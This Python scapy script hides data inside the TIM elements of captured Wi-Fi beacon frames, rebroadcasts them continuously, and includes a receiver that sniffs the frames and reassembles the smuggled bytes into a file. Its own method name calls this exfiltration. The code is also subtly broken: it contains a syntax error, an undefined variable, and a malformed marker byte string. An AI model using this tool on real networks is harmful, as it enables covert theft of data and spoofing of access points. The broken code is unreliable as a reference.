import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11Elt
import math

class BeaconFrameProcessor:
    def __init__(self, interface):
        self.interface = interface
        self.beacon_frames = []
        self.injected_frames = []

    #Make a list of beacon frames of unique APs in the vicinity
    def capture_beacon_frames(self, count=None, timeout=None):
        ap_list=[]
        def beacon_packet_handler(packet):
            if packet.haslayer(Dot11Beacon):
                if packet.addr2 not in ap_list:
                    ap_list.append(packet.addr2)
                    self.beacon_frames.append(packet)
                print("Access Point MAC: %s with SSID: %s " %(packet.addr2, packet.info))

        print("Capturing beacon frames...")
        try:
            sniff_kwargs = {'iface': self.interface, 'prn': beacon_packet_handler, 'store': 0}
            if count is not None:
                sniff_kwargs['count'] = count
            if timeout is not None:
                sniff_kwargs['timeout'] = timeout

            sniff(**sniff_kwargs)

        except PermissionError:
            print("Error: Please run this script with administrative privileges.")
            sys.exit(1)

    def replay_beacon_frames(self):
        print("Replaying captured beacon frames...")
        #for frame in self.beacon_frames:
        sendp(self.beacon_frames, iface=self.interface, loop=1,  verbose=1)   #Make this send continuously
    
    def inject_tim_element(self, pvb_array, dtim_count=0, dtim_period=1, bitmap_control=3):
        n=0
        # This code will cycle through the outer array and, for each element of the outer array, 
        # it will pick the corresponding element in the inner array, 
        # wrapping around if the inner array is shorter than the outer array.
        for i, pvb in enumerate(pvb_array):
            inner_index= i % len(self.beacon_frames)
            frame = self.beacon_frames[inner_index]
            if frame.haslayer(Dot11Beacon):
                # Create a TIM element
                tim_element = Dot11Elt(ID=5,  # TIM element ID is 5
                                    len=3 + len(pvb),  # Length of the TIM element (4 bytes fixed fields + length of the partial virtual bitmap)
                                    info=struct.pack('BBB', dtim_count, dtim_period, bitmap_control) + pvb)

                # Inject the TIM element into the frame
                if frame.haslayer(Dot11Elt):
                    frame[Dot11Elt].add_payload(tim_element)
                    n+=1

                else:
                    frame.add_payload(tim_element)
                    n+=1
                 


    
    def read_tim_element(self):
        for frame in self.beacon_frames:
            if frame.haslayer(Dot11Beacon):
                # Find the TIM element
                tim_element = None
                elt = frame[Dot11Beacon].payload
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 5:
                        print(elt.info)
                        tim_element = elt
                    elt = elt.payload

                # Read and print the TIM element fields
                if tim_element:
                    dtim_count, dtim_period, bitmap_control = struct.unpack('BBB', tim_element.info[:3])
                    partial_virtual_bitmap = tim_element.info[3:]

                    print("TIM Element:")
                    print(f"  DTIM Count: {dtim_count}")
                    print(f"  DTIM Period: {dtim_period}")
                    print(f"  Bitmap Control: {bitmap_control}")
                    print(f"  Partial Virtual Bitmap: {partial_virtual_bitmap}")
                else:
                    print("TIM Element not found in this frame")

    
    def receive_exfilterated_data(self, count=None, timeout=None):
        self.pvb_array_reconstructed = []
        def beacon_packet_handler(packet):
            if packet.haslayer(Dot11Beacon):
                tim_element = None
                elt = packet[Dot11Beacon].payload
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 5:
                        print(elt.info)
                        tim_element = elt
                    elt = elt.payload

                # Read and print the TIM element fields
                if tim_element:
                    dtim_count, dtim_period, bitmap_control = struct.unpack('BBB', tim_element.info[:3])
                    partial_virtual_bitmap = tim_element.info[3:]

                    print("TIM Element:")
                    print(f"  DTIM Count: {dtim_count}")
                    print(f"  DTIM Period: {dtim_period}")
                    print(f"  Bitmap Control: {bitmap_control}")
                    print(f"  Partial Virtual Bitmap: {partial_virtual_bitmap}")
                    self.pvb_array_reconstructed.append(partial_virtual_bitmap)
                else:
                    print("TIM Element not found in this frame")

        print("Capturing beacon frames...")
        try:
            sniff_kwargs = {'iface': self.interface, 'prn': beacon_packet_handler, 'store': 0}
            if count is not None:
                sniff_kwargs['count'] = count
            if timeout is not None:
                sniff_kwargs['timeout'] = timeout

            sniff(**sniff_kwargs)

        except PermissionError:
            print("Error: Please run this script with administrative privileges.")
            sys.exit(1)

    #Take the array of PVB that has been received and reconstructed, and get the bytes in order
    def write_file(self,filename):
        #Lets get our markers. 
        m1 = b'0x5E'
        m2 = b'0x5F'
        m3 = b'0x5G'
        
        sorted_tuples = []
        for data in self.pvb_array_reconstructed:
            m1_position = data.find(m1)
            m2_position = data.find(m2)
            m3_position = data.find(m3)
            if m1_position != -1 and m2_position != -1 and m3_position != -1:
            #Add length of markers to avoid including it. Get start and end positions of data in the bytecode
                start_total_payload_count = m1_position + len(m1)
                end_=_total_payload_count = m2_position

                start_payload_position = m2_position + len(m2)
                end_payload_position = data.find(m3)

                start_payload = data.find(m3) + len(m3)

                payload_position = int.from_bytes(data[start_payload_position:end_payload_position], byteorder)
                payload = data[start_payload:]
                sorted_tuples.append((payload_position, payload))
                
        #Sorted tuples is still very unsorted. We need to make it unique and sorted by the payload position
        unique_sorted_tuples = []
        seen_payloads = set()
        for t in sorted_tuples:
            if t[1] not in seen_payloads:
                unique_sorted_tuples.append(t)
                seen_payloads.add(t[1])
        #Sort according to the first element of the tuple - ie the payload position
        unique_sorted_tuples.sort(key=lambda x: x[0])
        unique_sorted_payloads = [t[1] for t in unique_sorted_tuples]

        # Join all extracted byte strings in the array
        combined_data = b''.join(unique_sorted_payloads)

        # Write the combined data to a file
        output_file_path = filename
        with open(output_file_path, 'wb') as file1:
            file1.write(combined_data)


